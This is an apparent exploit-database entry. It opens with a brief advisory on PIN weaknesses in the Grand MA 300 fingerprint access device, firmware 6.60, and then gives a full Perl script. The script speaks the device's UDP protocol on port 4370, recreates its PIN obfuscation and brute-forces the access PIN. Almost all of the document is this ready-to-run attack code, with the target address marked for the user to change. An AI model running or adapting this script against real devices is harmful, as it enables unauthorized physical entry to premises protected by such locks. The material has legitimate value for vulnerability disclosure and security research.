source: http://www.securityfocus.com/bid/69390/info
 
Grand MA 300 is prone to multiple security weaknesses.
 
Attackers can exploit these issues to disclose the access pin by sniffing network traffic or perform brute-force attacks on pin to gain unauthorized access. This may aid in other attacks.
 
Grand MA 300 running firmware version 6.60 is vulnerable. 

#!/usr/bin/perl
#
# This brute-forces the pin of a Grand MA 300 Fingerprint
# Access device in less than 5 minutes, if the pin
# is between 1 and 4294967296.
#
# written by Eric Sesterhenn <eric.sesterhenn () lsexperts de>
# http://www.lsexperts.de
#
use IO::Socket::INET;
use strict;
use warnings;

sub hexd {
        my ($data) = @_;
        my $ret = "";
        for (my $i=0; $i<length($data); $i++) {
                $ret .= sprintf "%X", ord(substr($data, $i, 1));
        }
        return $ret;
}
sub getword {
        my ($data, $offset) = @_;
        my $ret = 0;

        $ret = ord(substr($data, $offset, 1));
        $ret += 0x100 * ord(substr($data, $offset+1, 1));
        return $ret;
}

sub makeword {
        my ($value) = @_;

        my $ret = chr(($value & 0xFF)) . chr((($value >> 8) & 0xFF));

        return $ret;
}

sub calccrc {
        my ($packet) = @_;
        # we pad with zero for packets of uneven length
        my $newpacket = substr($packet, 0, 2) . substr($packet, 4) . chr(0);
        my $crc = 0;

        # the crc is the sum of all words in the packet
        for (my $i = 0; $i<length($packet) - 2; $i += 2) {
                $crc += getword($newpacket, $i);
        }

        # if the result is to big, we add the high bits to the lower bits
        while ($crc > 0xFFFF) {
                $crc = ($crc & 0xFFFF) + ($crc >> 0x10);
        }

        # negate the checksum
        $crc = ~$crc & 0xFFFF;
        return $crc;
}

sub makepacket {
        my ($type, $cid, $seqno, $data) = @_;
        my $crc = calccrc(makeword($type).makeword(0).makeword($cid).makeword($seqno).$data);
        return makeword($type).makeword($crc).makeword($cid).makeword($seqno).$data;
}

sub calcpass {
        my ($pin, $cid) = @_;
        my $ret = 0;

        # revert the bits
        for (my $i = 0; $i < 32; $i++) {
          $ret *= 2;
          if ($pin & 1) {
            $ret = $ret + 1;
          }
          $pin = $pin / 2;
        }

        $ret += $cid;

        # xor with magic value
        $ret ^= 0x4F534B5A;

        # switch the words
        $ret = (($ret & 0xFFFF) << 16) + ($ret >> 16);

        # xor all, but third byte with last byte of gettickcount
        my $gc = 0x00;
        $ret ^= $gc + ($gc << 8) + ($gc << 24);

        # set third byte to last byte of gettickcount
        # this weakens the algorithm even further, since this byte
        # is no longer relevant to the algorithm
        $ret = ($ret & 0xFF000000) + ($gc << 16) + ($ret & 0xFFFF);
        
        return $ret;
}

# flush after every write
local $| = 1;

my ($socket,$client_socket);

# creating object interface of IO::Socket::INET modules which internally creates
# socket, binds and connects to the TCP server running on the specific port.

my $data;
$socket = new IO::Socket::INET (
        PeerHost => '192.168.1.201',    # CHANGEME
        PeerPort => '4370',
        Proto => 'udp',
) or die "ERROR in Socket Creation : $!\n";

# initialize the connection
$socket->send(makepacket(1000, 0, 0, ""));
$socket->recv($data, 1024);

my $typ = getword($data, 0);
my $cid = getword($data, 4);
if ($typ != 2005) {
        printf("Client does not need a password");
        exit(-1);
}

for (my $i = 0; $i < 65536; $i++) {
        if (($i % 10) == 0) { printf "$i\n"; }
        my $pass = calcpass($i, $cid);
        $socket->send(makepacket(1102, $cid, $i + 1, pack("V", $pass)));

        $socket->recv($data, 1024);
        $typ = getword($data, 0);
        if ($typ == 2000) {
                printf("Found pin: %d\n", $i);
                exit(0);
        }
}

# disconnect
$socket->send(makepacket(1001, $cid, 2, ""));

$socket->close();